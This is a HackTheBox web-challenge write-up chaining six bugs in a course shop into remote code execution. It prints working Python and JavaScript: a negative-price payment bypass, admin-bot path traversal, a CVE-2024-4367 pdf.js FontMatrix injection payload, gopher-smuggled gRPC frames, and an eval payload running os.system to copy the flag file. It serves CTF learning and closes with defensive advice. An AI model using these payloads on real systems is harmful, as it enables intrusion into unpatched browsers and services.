---
title: "ArtificialUniversity — HTB web challenge writeup"
published: 2026-11-05
description: "Turning a fake price field into RCE: payment bypass, admin bot traversal, pdf.js CVE-2024-4367, gopher-delivered gRPC frames, and an eval sink — six bugs, one flag."
tags: [web, hackthebox, ssrf, xss, grpc, rce]
category: CTF
draft: false
---

This one took me a while. The shop itself has no obvious injection, the session can't be forged,
and the flag is saved with a randomized filename (`/flag<random>.txt`), so plain file read wouldn't
be enough even if we found one. The intended path ends in `eval()` inside an internal gRPC service,
and getting there touches six separate bugs.

I'll do it the way I actually solved it: read the source first and collect the pieces, then build
the chain one step at a time, testing each piece on a local Docker copy before touching the real
instance.

![The challenge: an online shop selling courses](/images/au/step1_home.png)

## Part 1 — reading the source

### What's in the box

Two services run in the container (check `supervisord.conf`): the Flask shop on port 1337 — the
only one exposed — and a gRPC server on 50051, bound to `[::]` but not published. So the gRPC code
is unreachable from outside; if we want it, the shop has to take us there.

![Project layout](/images/au/src_tree.png)

The files that matter: `routes.py` (every endpoint), `bot.py` (a headless Firefox that logs in as
admin), `curl.py` (runs subprocess curl), `api.py` (the gRPC service, contains the `eval`).

### entrypoint.sh — why RCE is mandatory

![entrypoint.sh](/images/au/src_entrypoint.png)

The flag gets renamed to `/flag<random10hex>.txt` on boot. Random name means "read a known path" is
dead on arrival — we need to run a command (list the directory, or just glob-copy the file somewhere
downloadable). Everything after this point is in service of getting shell-level execution.

### Dockerfile — two odd choices

![Dockerfile hints](/images/au/src_dockerfile.png)

Two things don't belong in an online shop: **curl 7.70.0** compiled from source (why not apt's?) and
**Firefox + geckodriver** (a browser, in a shop?). Keep both in mind — the curl version turns out to
be load-bearing for the gopher trick, and the Firefox install is the admin bot.

### api.py — the sink

When I can't find the way in, I grep for dangerous calls. Here there's exactly one:

![api.py — eval sink](/images/au/src_api.png)

`eval(self.price_formula)` in `GenerateProduct`. To use it I need:

1. a way to **set** `price_formula` on the service object — `DebugService` does an unchecked
   dict-merge (`UpdateService`) with attacker-supplied keys;
2. a way to **call** `GetNewProducts`, which is what runs `GenerateProduct` — that happens when
   someone opens `/admin/product-stream`.

> Problem: both need admin, and DebugService needs raw gRPC access to `127.0.0.1:50051` — which is
> exactly what curl-in-the-shop can give us, if we can reach it. That's the whole challenge in one
> sentence: **bot → curl → gRPC → eval**.

### routes.py — the free order and the bot

Checkout has an odd branch: without a `product_id`, it builds an order from raw query parameters —
including `price`. And `payments.py` is a stub:

```python
def get_amount_paid(payment_id):
    # Dummy implementation to get a payment status
    return 0
```

Payment success is decided by `amount_paid >= order.price`. We "paid" zero. You can see where this
is going: order something at **price -1** and it's instantly completed. Why do we want a completed
order? Because completion calls this:

```python
def checkout_success():
    ...
    if amt_paid >= order.price:
        db_session.mark_order_complete(order_id)
    bot_runner(current_app.config["ADMIN_EMAIL"], current_app.config["ADMIN_PASS"], payment_id)
```

The bot logs in as admin, then does:

```python
client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")
```

And `payment_id` here is just a query parameter on `/checkout/success` — we type whatever we want
into the middle of a URL the admin's browser then visits. Firefox removes `../` from paths, so this
is arbitrary-page traversal with an admin session. Three bugs found in about ten lines of code.

![routes.py checkout/success](/images/au/src_checkout_success.png)

![bot.py](/images/au/src_bot.png)

### The admin endpoints — view-pdf and api-health

Two admin routes do network calls for us:

![admin SSRF endpoints](/images/au/src_admin.png)

`view-pdf` fetches any URL with `requests` (no scheme check) and replays the body as
`application/pdf`. `api-health` runs curl on our URL — and `curl.py`'s "validation" only checks that
a scheme and host exist, so `gopher://` walks right through. gopher is the interesting one: curl
sends the URL's selector **as raw bytes** to the target port. That's our delivery mechanism for
hand-crafted gRPC frames.

![curl.py](/images/au/src_curl.png)

### What I ruled out

Worth writing down so you don't re-tread: all templates autoescape (I checked every `{{ }}` — no
`|safe` anywhere), so no HTML XSS. The Flask session is signed with `os.urandom(50).hex()` — can't
forge the admin cookie. `save-product` uses `ast.literal_eval`, which is safe. The invoice PDF we
can influence only carries escaped text. And the bot can only GET — `api-health` needs a POST, so
something inside the browser has to send that POST for us. That's the gap CVE-2024-4367 fills.

![payments.py and dead ends](/images/au/src_misc.png)

## Part 2 — the exploit

Order of operations: build the chain locally first (same Dockerfile), confirm each piece separately,
then run it once against the real box. Below, every step has the actual code I used.

### 1. Free order (payment bypass)

Register, log in, create the negative-price order, grab the order id from `/subs`:

```python
import requests, re, base64
s = requests.Session()
BASE = "http://127.0.0.1:1337"          # local copy first!
EMAIL, PASSWORD = "me@evil.com", "Passw0rd123!"

s.post(f"{BASE}/register", data={"email": EMAIL, "password": PASSWORD})
s.post(f"{BASE}/login",    data={"email": EMAIL, "password": PASSWORD})

# the session cookie is only signed, not encrypted - the payload is readable base64
cookie = next(c.value for c in s.cookies if c.name == "session")
payload = base64.urlsafe_b64decode(cookie.split(".")[0] + "==").decode()
uid = int(re.search(r'"user_id":(\d+)', payload).group(1))

s.get(f"{BASE}/checkout", params={
    "price": "-1", "title": "ORDERX", "user_id": uid, "email": EMAIL},
    allow_redirects=False)

subs = s.get(f"{BASE}/subs").text
order_id = re.findall(r'<td[^>]*>(\d+)</td>', subs)[0]
```

`user_id` must match a real user row, otherwise `generate_invoice` quietly bails. Here's the local
instance showing the -1 order:

![Orders page showing Price: -1.0](/images/au/step3_subs_negative_order.png)

### 2. Bot trigger + traversal

Now the fun part. The bot's URL is built as
`/static/invoices/invoice_{payment_id}.pdf`, and we own `payment_id` at `/checkout/success` time
(it doesn't even have to match the order):

```python
trav = "q/../../../admin/view-pdf?url=https://webhook.site/xxxx?x=.pdf"
s.get(f"{BASE}/checkout/success",
      params={"order_id": order_id, "payment_id": trav}, timeout=120)
```

Path math: `/static/invoices/invoice_q/` is three levels deep, so **three** `../`. I initially sent
two and everything silently 404'd — the bot doesn't complain, it just opens a dead page. Cost me a
good half hour.

The `?x=.pdf` at the end isn't decoration: the route template glues a literal `.pdf` after our
string, and the fake query parameter swallows it. The whole request takes ~25 seconds because the
bot logs in (3s+3s), views the page and sleeps 10s — that delay is your confirmation it ran. To test
traversal by itself, point `payment_id` at
`checkout?price=-9&title=BOTWASHERE&user_id=<uid>&email=x` and watch your /subs page; if the bot
created an order, it obeys your URLs.

![Bot trigger with traversal](/images/au/step_trav.png)

### 3. Getting our own PDF rendered (view-pdf SSRF)

view-pdf forces `application/pdf` on whatever it fetches, and Firefox renders that in pdf.js. So if
I host a PDF on a public box, the bot ends up rendering **my** PDF:

```python
t = requests.post("https://webhook.site/token", json={
    "default_status": 200,
    "default_content": pdf.decode(),            # pdf must be pure ASCII (see below)
    "default_content_type": "application/pdf",  # checked with exact string compare
}).json()
url = f"https://webhook.site/{t['uuid']}?x=.pdf"
assert requests.get(url).content == pdf          # round-trip check
```

Two things that bit me here. First, the container needs outbound access — I checked early with a
Collaborator URL through the same view-pdf path before building anything else. Second, webhook.site
re-encodes content as UTF-8, and my first PDF had a binary comment line (`%âãÏÓ`) that got mangled.
Dropping that line (pdf.js doesn't care) makes the PDF pure ASCII and the round-trip byte-perfect.

For scale, this is the invoice the bot is supposed to open:

![Normal invoice](/images/au/step4_invoice.png)

### 4. CVE-2024-4367 — JavaScript from inside the PDF

Firefox 125 renders PDFs with pdf.js, which is vulnerable to CVE-2024-4367 (fixed in Firefox 126 /
pdf.js 4.2.67). When pdf.js draws a glyph it builds a JS function and concatenates the font's
`FontMatrix` entries into it without type-checking. A FontMatrix entry can be a string. String goes
in, code comes out. [Codean Labs](https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js)
wrote this up; the PDF below follows their PoC shape.

```python
def pdf_escape(s):
    return s.replace("\\", r"\\").replace("(", r"\(").replace(")", r"\)")

js = ("(async()=>{if(!window.__p){window.__p=1;"     # runs once per glyph - guard it
      "var mk=function(a,m,n,v){var f=document.createElement('form');"
      "f.method=m;f.action=a;f.target='t'+Math.random();"   # submit into an iframe
      "if(n){var i=document.createElement('input');i.name=n;i.value=v;"
      "f.appendChild(i);}"
      "document.body.appendChild(f);f.submit();};"
      "mk('/admin/api-health','POST','url','" + gopher + "');"
      "setTimeout(function(){mk('/admin/product-stream','GET',null,null)},5000);"
      "}}) ("                                          # pdf.js appends ");"

inject = "1); \n" + js
fontmatrix = f"[0.1 0 0 0.1 0 ({pdf_escape(inject)})]"
```

Why the weird start and end: pdf.js generates
`c.transform(0.1,0,0,0.1,0,` **our string** `);`. So the string opens with `1);` to close that call,
and leaves a dangling `(` at the end that the generated `);` completes into a call — i.e. it invokes
our async function. The `window.__p` guard matters because the payload runs per compiled glyph and
the page draws 12 of them — without it you fire 12 parallel attack chains at your own target.

Getting the quoting right took a couple of iterations; pdf.js just throws
`unexpected token: ')'` if the string is off, which at least tells you the injection point is live.

### 5. The POST problem (and the form fix)

So now we have JS in the admin's browser. The obvious move —
`fetch('/admin/api-health', {method:'POST', body:...})` — fails with a 302. The pdf.js scripting
context strips cookies from fetch, so the request lands unauthenticated. The server log made this
obvious: a pile of 302s where 200s should be.

A real `<form>` submit works, because it's a navigation, and navigations carry cookies (the Flask
cookie has no SameSite attribute and Firefox doesn't force Lax-by-default). Submitting into an
iframe keeps our page alive so the second action can still fire:

![bot activity in the logs](/images/au/step6_botlog.png)

![admin POST working](/images/au/step10_debug.png)

That's the money shot: `POST /admin/api-health 200` (authenticated!) and five seconds later
`GET /admin/product-stream 200`, which is what pulls the eval trigger.

### 6. gopher → raw HTTP/2 → gRPC

api-health runs `curl -o /dev/null -w %{http_code} <url>`. With
`gopher://127.0.0.1:50051/_DATA`, curl connects to the internal gRPC port and sends DATA decoded as
raw bytes. gRPC is HTTP/2, so DATA has to be a full h2 request: preface, SETTINGS, HEADERS (HPACK),
DATA with the grpc length-prefixed message. All binary, full of NUL bytes — and modern curl rejects
`%00` in URLs outright:

![curl NUL byte test](/images/au/step5_nul.png)

This is why the Dockerfile compiles 7.70.0: its gopher handler calls
`Curl_urldecode(..., FALSE)` (gopher.c:119) — no control-character rejection. I checked the 7.70.0
source before trusting it, and later compiled that exact version locally to rehearse.

Building the frames by hand (no grpc library needed for the wire format):

```python
def hpack(name, value):        # literal header, no indexing, no huffman
    n, v = name.encode(), value.encode()
    return bytes([0x00, len(n)]) + n + bytes([len(v)]) + v

def frame(t, flags, sid, payload):
    return struct.pack(">I", len(payload))[1:] + bytes([t, flags]) \
         + struct.pack(">I", sid) + payload

def pb_str(field, data):       # protobuf tag + varint length + bytes
    out, n = bytearray([field << 3 | 2]), len(data)
    while True:
        b = n % 128; n //= 128
        out.append(b | 0x80 if n else b)
        if not n: break
    return bytes(out) + data

def debugservice_gopher(formula):
    key  = pb_str(1, b"price_formula")
    val  = pb_str(2, pb_str(1, formula.encode()))
    msg  = pb_str(1, pb_str(1, key + val))     # map<string, InputValue>
    hdrs = b"".join(hpack(k, v) for k, v in [
        (":method","POST"), (":scheme","http"),
        (":path","/product.ProductService/DebugService"),
        (":authority","127.0.0.1:50051"),
        ("content-type","application/grpc"), ("te","trailers")])
    raw  = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    raw += frame(4, 0, 0, b"")                          # SETTINGS
    raw += frame(1, 4, 1, hdrs)                         # HEADERS, END_HEADERS
    raw += frame(0, 1, 1, b"\x00" + struct.pack(">I", len(msg)) + msg)  # DATA, END_STREAM
    raw += frame(7, 0, 0, struct.pack(">II", 1, 0))     # GOAWAY - server closes, curl exits
    return "gopher://127.0.0.1:50051/_" + quote(raw, safe="")
```

The trailing GOAWAY isn't decoration: without it the server holds the h2 connection open, curl never
exits, and the Flask thread hangs on the bot's POST forever. With it, the server answers, closes,
and everything returns cleanly.

### 7. Proving the eval, locally

Before aiming this at the real target I ran the whole thing against a local build. Setting
`price_formula = "7777+7777"` via the PDF, then poking `GetNewProducts` with a plain gRPC client:

![eval proof](/images/au/step7_rce.png)

`price=15554.0` — the eval ran. (Small tip: if your probe script also calls DebugService to set a
formula, you'll clobber your own test — I did exactly that once and chased phantom results for a
while.)

The production payload copies the flag instead of printing it, because the eval result only ever
becomes a product price (a double) — we'd never see a string. `os.system()` returns an int, which
fits, and the side effect is what matters:

```python
RCE = "__import__('os').system(\"cp /flag*.txt "
      "/app/store/application/static/invoices/pwn.txt; "
      "chmod 644 /app/store/application/static/invoices/pwn.txt\")"
```

`/flag*.txt` handles the random name from entrypoint.sh; the static folder is the one place we can
afterwards GET without credentials.

### 8. Running it on the challenge

One shot: the script registers, orders, builds and hosts the PDF, fires the bot, then polls for the
copied flag. Total wall time ~30 seconds, most of it the bot's sleep.

![Remote exploit run](/images/au/step8_remote.png)

### 9. Flag

![Flag served over HTTP](/images/au/step9_flag.png)

```
HTB{██████████████████████}
```

*(flag redacted — no freebies, go earn it)*

## Takeaways

- The **build files are attack surface**: pinned curl 7.70.0 and a Firefox install in a shop
  announced the whole second half of the chain.
- **Small bugs chain hard**: six individually-boring issues (a dummy payment stub, a query param
  pasted into a URL) end in RCE.
- **Don't trust memory over the shipped binary**: pdf.js's `submitForm`/`launchURL` are stubs in
  this build; the unzipped `omni.ja` settled every "does this version do X?" question.
- **Privileged contexts change cookie behavior**: fetch() lost cookies, form submits didn't.
- **Rehearse locally, fire once**: local Docker + compiled 7.70.0 curl made the remote run a
  one-shot.

| # | Where | Bug |
|---|-------|-----|
| 1 | `/checkout` | attacker-controlled price |
| 2 | `/checkout/success` | dummy payment check + bot_runner takes payment_id from query |
| 3 | `bot.py` | payment_id concatenated into the bot's URL (traversal) |
| 4 | `/admin/view-pdf` | SSRF, body replayed as application/pdf |
| 5 | pdf.js 4.1.342 | CVE-2024-4367 FontMatrix JS injection |
| 6 | `/admin/api-health` + api.py | curl SSRF (gopher, NUL-safe on 7.70.0) → DebugService merge → eval |

FontMatrix bug credit: [Codean Labs — CVE-2024-4367](https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js).
If you're defending an app like this: validate prices server-side, don't concatenate user input
into bot URLs, scheme-allowlist in fetch helpers, patch pdf.js (≥4.2.67), and don't expose debug
RPCs that merge arbitrary attributes — "internal only" is not an auth boundary when SSRF is around.
